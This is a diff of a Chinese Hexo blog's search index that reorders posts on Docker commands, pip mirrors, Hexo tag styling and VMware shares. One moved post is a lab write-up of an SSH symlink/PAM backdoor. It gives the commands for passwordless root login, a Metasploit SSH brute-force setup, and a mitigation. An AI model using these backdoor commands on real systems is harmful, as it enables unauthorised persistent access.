@@ -15,7 +15,7 @@
   <entry>
     <title><![CDATA[docker命令]]></title>
     <url>%2F2019%2F08%2F08%2Fdocker%E5%91%BD%E4%BB%A4-2019%2F</url>
-    <content type="text"><![CDATA[docker命令拉取镜像1docker pull 查看镜像列表1docker image ls 查看容器列表1docker container ls 运行镜像12345678910111213docker run -it --rm ubuntu:18.04 bash-it：这是两个参数，一个是 -i：交互式操作，一个是 -t 终端。我们这里打算进入 bash 执行一些命令并查看返回结果，因此我们需要交互式终端。--rm：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 docker rm。我们这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 --rm 可以避免浪费空间。ubuntu:18.04：这是指用 ubuntu:18.04 镜像为基础来启动容器。bash：放在镜像名后的是 命令，这里我们希望有个交互式 Shell，因此用的是 bash。docker run --name webserver -d -p 80:80 nginx-d 在后台运行-p 指定端口映射增加端口可以通过iptables进行端口转发iptables -t nat -A PREROUTING -p tcp -m tcp --dport 803 -j DNAT --to-destination 172.17.0.2:803 进入已经运行的容器1docker exec -it webserver bash 删除镜像123456docker imagesdocker ps -a docker stop 容器ID docker rm 容器ID docker rmi 镜像 docker rmi -f 将容器保存为镜像（慎用，此操作后期维护极其麻烦）1234567 docker commit --author "Tao Wang &lt;twang2218@gmail.com&gt;" \ --message "修改了默认网页" \ webserver \ nginx:v2其中 --author 是指定修改的作者，而 --message 则是记录本次修改的内容。这点和 git 版本控制相似，不过这里这些信息可以省略留空。 导出容器如果要导出本地某个容器，可以使用 docker export 命令。 1234$ docker container ls -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES7691a814370e ubuntu:18.04 "/bin/bash" 36 hours ago Exited (0) 21 hours ago test$ docker export 7691a814370e &gt; ubuntu.tar 这样将导出容器快照到本地文件。 导入容器快照可以使用 docker import 从容器快照文件中再导入为镜像，例如 1234$ cat ubuntu.tar | docker import - test/ubuntu:v1.0$ docker image lsREPOSITORY TAG IMAGE ID CREATED VIRTUAL SIZEtest/ubuntu v1.0 9d37a6082e97 About a minute ago 171.3 MB 此外，也可以通过指定 URL 或者某个目录来导入，例如 1$ docker import http://example.com/exampleimage.tgz example/imagerepo 注：用户既可以使用 docker load 来导入镜像存储文件到本地镜像库，也可以使用 docker import 来导入一个容器快照到本地镜像库。这两者的区别在于容器快照文件将丢弃所有的历史记录和元数据信息（即仅保存容器当时的快照状态），而镜像存储文件将保存完整记录，体积也要大。此外，从容器快照文件导入时可以重新指定标签等元数据信息。]]></content>
+    <content type="text"><![CDATA[docker命令 拉取镜像1docker pull 查看镜像列表1docker image ls 查看容器列表1docker container ls 运行镜像12345678910111213docker run -it --rm ubuntu:18.04 bash-it：这是两个参数，一个是 -i：交互式操作，一个是 -t 终端。我们这里打算进入 bash 执行一些命令并查看返回结果，因此我们需要交互式终端。--rm：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 docker rm。我们这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 --rm 可以避免浪费空间。ubuntu:18.04：这是指用 ubuntu:18.04 镜像为基础来启动容器。bash：放在镜像名后的是 命令，这里我们希望有个交互式 Shell，因此用的是 bash。docker run --name webserver -d -p 80:80 nginx-d 在后台运行-p 指定端口映射增加端口可以通过iptables进行端口转发iptables -t nat -A PREROUTING -p tcp -m tcp --dport 803 -j DNAT --to-destination 172.17.0.2:803 进入已经运行的容器1docker exec -it webserver bash 删除镜像123456docker imagesdocker ps -a docker stop 容器ID docker rm 容器ID docker rmi 镜像 docker rmi -f 将容器保存为镜像（慎用，此操作后期维护极其麻烦）1234567 docker commit --author "Tao Wang &lt;twang2218@gmail.com&gt;" \ --message "修改了默认网页" \ webserver \ nginx:v2其中 --author 是指定修改的作者，而 --message 则是记录本次修改的内容。这点和 git 版本控制相似，不过这里这些信息可以省略留空。 导出容器如果要导出本地某个容器，可以使用 docker export 命令。 1234$ docker container ls -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES7691a814370e ubuntu:18.04 "/bin/bash" 36 hours ago Exited (0) 21 hours ago test$ docker export 7691a814370e &gt; ubuntu.tar 这样将导出容器快照到本地文件。 导入容器快照可以使用 docker import 从容器快照文件中再导入为镜像，例如 1234$ cat ubuntu.tar | docker import - test/ubuntu:v1.0$ docker image lsREPOSITORY TAG IMAGE ID CREATED VIRTUAL SIZEtest/ubuntu v1.0 9d37a6082e97 About a minute ago 171.3 MB 此外，也可以通过指定 URL 或者某个目录来导入，例如 1$ docker import http://example.com/exampleimage.tgz example/imagerepo 注：用户既可以使用 docker load 来导入镜像存储文件到本地镜像库，也可以使用 docker import 来导入一个容器快照到本地镜像库。这两者的区别在于容器快照文件将丢弃所有的历史记录和元数据信息（即仅保存容器当时的快照状态），而镜像存储文件将保存完整记录，体积也要大。此外，从容器快照文件导入时可以重新指定标签等元数据信息。]]></content>
       <categories>
         <category>运维</category>
       </categories>
@@ -157,6 +157,17 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[Python更换pip源]]></title>
+    <url>%2F2019%2F02%2F27%2FPython%E6%9B%B4%E6%8D%A2pip%E6%BA%90-2019%2F</url>
+    <content type="text"><![CDATA[默认的pip源太慢，换成国内源会快很多 Python更换pip源 对于Python开发用户来讲，PIP安装软件包是家常便饭。但国外的源下载速度实在太慢，浪费时间。而且经常出现下载后安装出错问题。所以把PIP安装源替换成国内镜像，可以大幅提升下载速度，还可以提高安装成功率。 国内源12345678910111213新版ubuntu要求使用https源，要注意。清华：https://pypi.tuna.tsinghua.edu.cn/simple阿里云：http://mirrors.aliyun.com/pypi/simple/中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/华中理工大学：http://pypi.hustunique.com/山东理工大学：http://pypi.sdutlinux.org/豆瓣：http://pypi.douban.com/simple/ 临时使用123可以在使用pip的时候加参数-i http://mirrors.aliyun.com/pypi/simple/例如：pip install -i http://mirrors.aliyun.com/pypi/simple/ pyspider，这样就会从清华这边的镜像去安装pyspider库。 永久修改，一劳永逸Linux下，修改 ~/.pip/pip.conf (没有就创建一个文件夹及文件。文件夹要加“.”，表示是隐藏文件夹) 内容如下： 123[global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple[install] trusted-host=mirrors.aliyun.com windows下，直接在user目录中创建一个pip目录，如：C:\Users\xx\pip，新建文件pip.ini。内容同上。 新建 pip 配置文件夹先在 windows “文件资源管理器” 地址栏 输入 %APPDATA% 按回车，打开程序自定义设置文件夹 然后，创建名为 pip 的文件夹，用于存放 pip 配置文件 新建 pip 配置文件在刚才创建好的 pip 文件夹中，新建 名为 pip.ini 的配置文件 设置 pip 国内源 (使用 阿里云 国内镜像)在 pip.ini 文件中输入以下内容，然后保存 1234567[global]index-url=http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com 验证设置按 windows 徽标+ R，输入 cmd，按回车，调出 windows 命令行窗口 尝试用 pip 安装一个比较大一点的包，譬如 kivy.deps.gstreamer (约 120 M) 1python -m pip install kivy.deps.gstreamer 注意到 pip 从阿里云 (aliyun) 下载，速度达到了每秒 7.5 M，快到飞起来]]></content>
+      <categories>
+        <category>编程</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Next主题标签页标签随机颜色的设置方法]]></title>
     <url>%2F2019%2F02%2F27%2FNext%E4%B8%BB%E9%A2%98%E6%A0%87%E7%AD%BE%E9%A1%B5%E6%A0%87%E7%AD%BE%E9%9A%8F%E6%9C%BA%E9%A2%9C%E8%89%B2%E7%9A%84%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95-2019%2F</url>
     <content type="text"><![CDATA[网上找了很久的办法，存下来 只需在\themes\next\layout\page.swig中的这一段中间 1234&lt;div class="tag-cloud-tags"&gt; &#123;&#123; tagcloud(&#123;min_font: 12, max_font: 30, amount: 200, color: true, start_color: '#ccc', end_color: '#111'&#125;) &#125;&#125; ————————————————————插入代码位置——————————————————————————&lt;/div&gt; 加上如下代码就可以了 1234567&lt;script type="text/javascript"&gt; var list = document.querySelectorAll('.tag-cloud-tags a'); Array.prototype.forEach.call(list, (item, index) =&gt; &#123; item.style.fontSize = Math.floor(Math.random() * 29 + 12) + 'px';//12 ~ 40 item.style.color = 'rgb(' + Math.floor(Math.random() * 201) + ', ' + Math.floor(Math.random() * 201) + ', ' + Math.floor(Math.random() * 201) + ')';// 0,0,0 -&gt; 200,200,200 &#125;);&lt;/script&gt; Ps: ​ min_font和max_font代表最大最小文字，可以自行更改]]></content>
@@ -166,17 +177,6 @@
       <tags>
         <tag>生活</tag>
         <tag>Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Python更换pip源]]></title>
-    <url>%2F2019%2F02%2F27%2FPython%E6%9B%B4%E6%8D%A2pip%E6%BA%90-2019%2F</url>
-    <content type="text"><![CDATA[默认的pip源太慢，换成国内源会快很多 Python更换pip源 对于Python开发用户来讲，PIP安装软件包是家常便饭。但国外的源下载速度实在太慢，浪费时间。而且经常出现下载后安装出错问题。所以把PIP安装源替换成国内镜像，可以大幅提升下载速度，还可以提高安装成功率。 国内源12345678910111213新版ubuntu要求使用https源，要注意。清华：https://pypi.tuna.tsinghua.edu.cn/simple阿里云：http://mirrors.aliyun.com/pypi/simple/中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/华中理工大学：http://pypi.hustunique.com/山东理工大学：http://pypi.sdutlinux.org/豆瓣：http://pypi.douban.com/simple/ 临时使用123可以在使用pip的时候加参数-i http://mirrors.aliyun.com/pypi/simple/例如：pip install -i http://mirrors.aliyun.com/pypi/simple/ pyspider，这样就会从清华这边的镜像去安装pyspider库。 永久修改，一劳永逸Linux下，修改 ~/.pip/pip.conf (没有就创建一个文件夹及文件。文件夹要加“.”，表示是隐藏文件夹) 内容如下： 123[global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple[install] trusted-host=mirrors.aliyun.com windows下，直接在user目录中创建一个pip目录，如：C:\Users\xx\pip，新建文件pip.ini。内容同上。 新建 pip 配置文件夹先在 windows “文件资源管理器” 地址栏 输入 %APPDATA% 按回车，打开程序自定义设置文件夹 然后，创建名为 pip 的文件夹，用于存放 pip 配置文件 新建 pip 配置文件在刚才创建好的 pip 文件夹中，新建 名为 pip.ini 的配置文件 设置 pip 国内源 (使用 阿里云 国内镜像)在 pip.ini 文件中输入以下内容，然后保存 1234567[global]index-url=http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com 验证设置按 windows 徽标+ R，输入 cmd，按回车，调出 windows 命令行窗口 尝试用 pip 安装一个比较大一点的包，譬如 kivy.deps.gstreamer (约 120 M) 1python -m pip install kivy.deps.gstreamer 注意到 pip 从阿里云 (aliyun) 下载，速度达到了每秒 7.5 M，快到飞起来]]></content>
-      <categories>
-        <category>编程</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -216,18 +216,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Linux软连接后门]]></title>
-    <url>%2F2018%2F11%2F09%2FLinux%E8%BD%AF%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8-2018%2F</url>
-    <content type="text"><![CDATA[记录一次Linux软连接后门实验过程，ctf攻防中可用做维持 一、实验过程1、在靶机执行并查看是否软连接建立完成12ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345netstat -tunlp | grep 12345 2、在攻击机利用ssh并使用任意密码登陆靶机1ssh root@192.168.86.135 -p 12345 3、如果被控制端的root禁止ssh登录，那么也可以用被控制端的其他用户登录 二、防范1、修改配置文件12vim /etc/ssh/sshd_config UsePAM no 2、重载ssh配置文件1/etc/init.d/sshd reload 3、验证，使用任意密码无法登陆，使用正确密码可以登录 三、延伸1此类ssh后门的核心是pam配置中的pam_rootok.so，是否只需包含这句话就可以实现后门功能,默认的配置文件中出来su，是否还有其他的可利用的配置文件 12345靶机：echo "auth sufficient pam_rootok.so" &gt;&gt; /etc/pam.d/hackercat /etc/pam.d/hackerln -sf /usr/sbin/sshd /tmp/hacker;/tmp/hacker -oport=2333netstat -tunlp | grep 2333 1攻击机： 123实践表明通过软连接文件名指定ssh的pam配置文件为hacker,只要文件中包含"auth sufficient pam_rootok.so"即可无密码登陆最后在etc/pam.d/目录下查找包含pam_rootok.so配置的文件 四、小结1、Linux软连接ssh后门需要ssh配置允许PAM认证才能使用2、如果被控主机不允许root登陆可用其他已存在用户登陆3、通过软连接的方式，实质上PAM认证是通过软连接的文件名（如：/tmp/su,/home/su）在/etc/pam.d/目录下寻找对应的PAM配置文件(如：/etc/pam.d/su)4、任意密码登陆的核心是auth sufficient pam_rootok.so,只要PAM配置文件中包含此配置即可 SSH任意密码登陆五、msf相应ssh登陆模块1、批量ssh登录：用msf的ssh登录模块1234567891011121314use auxiliary/scanner/ssh/ssh_loginset rhosts 192.168.10-100.1set username rootset password 123456run/exploitsessions // 查看成功登录的会话，sessions -i // 打开某个会话]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[vmware 设置共享目录]]></title>
     <url>%2F2018%2F11%2F09%2Fvmware_%E8%AE%BE%E7%BD%AE%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95-2018%2F</url>
     <content type="text"><![CDATA[vm-tools有时候不好用，用vm做一个共享目录可以解决无法拖动文件的问题 安装 Vmware-Tools123456789root@kali:~# apt-get install open-vm-tools-desktop fusevmware 命令root@kali:~# vmware- vmware-checkvm vmware-uninstall-tools.pl vmware-config-tools.pl vmware-user-suid-wrapper vmware-guestproxycerttool vmware-vgauth-cmd vmware-hgfsclient vmware-vgauth-smoketest vmware-namespace-cmd vmware-vmblock-fuse vmware-rpctool 查看共享目录命令1root@kali:~# vmware-hgfsclient 新建目录1root@kali:~# mkdir /mnt/hgfs/ShareDir/ 创建共享目录12root@kali:~# /usr/bin/vmhgfs-fuse .host:/ /mnt/ -o subtype=vmhgfs-fuse,allow_otherroot@kali:~# vmware-hgfsclient]]></content>
@@ -237,6 +225,18 @@
       <tags>
         <tag>Linux</tag>
         <tag>VMware</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Linux软连接后门]]></title>
+    <url>%2F2018%2F11%2F09%2FLinux%E8%BD%AF%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8-2018%2F</url>
+    <content type="text"><![CDATA[记录一次Linux软连接后门实验过程，ctf攻防中可用做维持 一、实验过程1、在靶机执行并查看是否软连接建立完成12ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345netstat -tunlp | grep 12345 2、在攻击机利用ssh并使用任意密码登陆靶机1ssh root@192.168.86.135 -p 12345 3、如果被控制端的root禁止ssh登录，那么也可以用被控制端的其他用户登录 二、防范1、修改配置文件12vim /etc/ssh/sshd_config UsePAM no 2、重载ssh配置文件1/etc/init.d/sshd reload 3、验证，使用任意密码无法登陆，使用正确密码可以登录 三、延伸1此类ssh后门的核心是pam配置中的pam_rootok.so，是否只需包含这句话就可以实现后门功能,默认的配置文件中出来su，是否还有其他的可利用的配置文件 12345靶机：echo "auth sufficient pam_rootok.so" &gt;&gt; /etc/pam.d/hackercat /etc/pam.d/hackerln -sf /usr/sbin/sshd /tmp/hacker;/tmp/hacker -oport=2333netstat -tunlp | grep 2333 1攻击机： 123实践表明通过软连接文件名指定ssh的pam配置文件为hacker,只要文件中包含"auth sufficient pam_rootok.so"即可无密码登陆最后在etc/pam.d/目录下查找包含pam_rootok.so配置的文件 四、小结1、Linux软连接ssh后门需要ssh配置允许PAM认证才能使用2、如果被控主机不允许root登陆可用其他已存在用户登陆3、通过软连接的方式，实质上PAM认证是通过软连接的文件名（如：/tmp/su,/home/su）在/etc/pam.d/目录下寻找对应的PAM配置文件(如：/etc/pam.d/su)4、任意密码登陆的核心是auth sufficient pam_rootok.so,只要PAM配置文件中包含此配置即可 SSH任意密码登陆五、msf相应ssh登陆模块1、批量ssh登录：用msf的ssh登录模块1234567891011121314use auxiliary/scanner/ssh/ssh_loginset rhosts 192.168.10-100.1set username rootset password 123456run/exploitsessions // 查看成功登录的会话，sessions -i // 打开某个会话]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
